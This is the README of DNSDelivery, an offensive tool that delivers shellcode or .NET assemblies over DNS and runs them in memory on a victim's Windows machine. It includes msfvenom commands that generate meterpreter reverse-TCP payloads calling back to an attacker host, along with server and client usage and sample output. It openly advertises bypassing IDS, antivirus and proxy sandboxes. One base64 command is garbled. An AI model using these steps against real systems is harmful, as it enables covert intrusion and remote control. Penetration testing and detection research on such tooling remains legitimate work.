DNS Delivery
============

Author: Arno0x0x - [@Arno0x0x](http://twitter.com/Arno0x0x)

DNSDelivery provides delivery and in memory execution of shellcode or .Net assembly using DNS requests delivery channel.

DNSDelivery has to sides:
  1. The server side, coming as a single python script (`dnsdelivery.py`), which acts as a custom DNS server, serving the payload data
  2. The client side (*victim's side*), which comes in two flavors:
    - `dnsdelivery.cs`: a C# script that can be compiled with `csc.exe` to provide a Windows managed executable
    - `Invoke-DNSDelivery`: a PowerShell script providing the exact same functionnalities

In order for the whole thing to work **you need to own your domain name** and set the DNS record for that domain to point to the server that will run the `dnsdelivery.py` server side.
For local testing purposes though, you can configure the client side scripts to point to any DNS server.

Dependencies
----------------------

The only dependency is on the server side, as the `dnsdelivery.py` script relies on the external **dnslib** library. You can installing it using pip:
```
pip install dnslib
```

Configuration
----------------------

The only mandatory configurable parameter on the client side is the DNS domain name you want to use (*the one you're running the DNS server side on*).
An optionnal configurable parameter is the DNS server you want to use. By default, it will use the system's default DNS server.

  - For the C# script, you need to edit the script and set the parameters in the PARAM class, comments and variable names are pretty self-explanatory. Then compile it using the built-in C# compiler csc.exe: `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /unsafe /out:dnsdelivery.exe *.cs`

  - For the PowerShell script, you can simply pass the parameters as arguments. Once the module is loaded into powershell simply check the syntax with `Get-Help Invoke-DNSDelivery`


Usage
----------------------

***SERVER SIDE***

Call the `dnsdelivery.py script with the appropriate parameters:
  - The `type` of content being delivered: can be either `shellcode` or `assembly`
  - The `filename` which is the name (*or path*) of the file being delivered

If a `shellcode` type is to be delivered, it **must** be a **raw** type shellcode obtained, for instance, from metasploit:

```
root@kali:~# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.52.130 LPORT=4444 -f raw > myShellcodeFile.raw
```

Example of delivering a shellcode:
```
root@kali:~# ./dnsdelivery.py shellcode myShellcodeFile.raw
[*] File [myShellcodeFile.raw] successfully loaded
[*] Data split into [5] chunks of 250 bytes
[*] DNS server listening on port 53
[*] Serving [myShellcodeFile.raw] advertised as a [shellcode] data type
```

Example of delivering a .Net assembly:
```
root@kali:~# ./dnsdelivery.py assembly peloader.exe
[*] File [peloader.exe] successfully loaded
[*] Data split into [1058] chunks of 250 bytes
[*] DNS server listening on port 53
[*] Serving [peloader.exe] advertised as a [assembly] data type
```

***CLIENT SIDE***

If using the C# compiled Windows executable: simply execute it, the parameters are hardcoded within the script.

If using the PowerShell script, well, call it in any of your prefered way (*you probably know tons of ways of invoking a powershell script*) along with the script parameters. Most basic example:
```
c:\DNSDelivery> powershell
PS c:\DNSDelivery> Import-Module .\Invoke-DNSDelivery.ps1
PS c:\DNSDelivery> Invoke-DNSDelivery -DomainName mydomain.example.com -Verbose
[...]
```

Sample use cases
----------------------

I found this delivery method very useful and handy for delivering:

- any meterpreter shellcode
- full-fledged meterpreter executable (*standalone meterpreter executable, not staged*)
- any .Net assembly you can think of

while completely **bypassing perimeter security** (IDS, content analysis like AV and sandboxes on proxies, etc.).

Example of delivering a full-fledged meterpreter executable:

First create a non-staged meterpreter executable:
```
root@kali:~# msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.52.130 LPORT=4444 -f exe-only > meterpreter.exe
```
Second, encode this executable to a base64 string:
```
root@kali:~# cat meterpreter.exe > base64 -w 0 > meterpreter.b64
```

Third paste the base64 string (*yes, it can be huge, around 3MB*) into the `peLoader.cs` (thx @SubTee) available here [peloader.cs](https://github.com/Arno0x/CSharpScripts/blob/master/peloader.cs) and compile this into a Windows executable (*which by the way IS a .Net assembly*).

Eventually, serve it with DNSDelivery:
```
root@kali:~# ./dnsdelivery.py assembly meterpreter_peloader.exe
```
It can be long because the data is delivered over DNS, chunk by chunk (*250 bytes per chunk*), but who cares if it takes 10 minutes and you eventually get you full-fledged meterpreter executable loaded into memory and executed on the victim's machine :-)

DISCLAIMER
----------------
This tool is intended to be used in a legal and legitimate way only:
  - either on your own systems as a means of learning, of demonstrating what can be done and how, or testing your defense and detection mechanisms
  - on systems you've been officially and legitimately entitled to perform some security assessments (pentest, security audits)

Quoting Empire's authors:
*There is no way to build offensive tools useful to the legitimate infosec industry while simultaneously preventing malicious actors from abusing them.*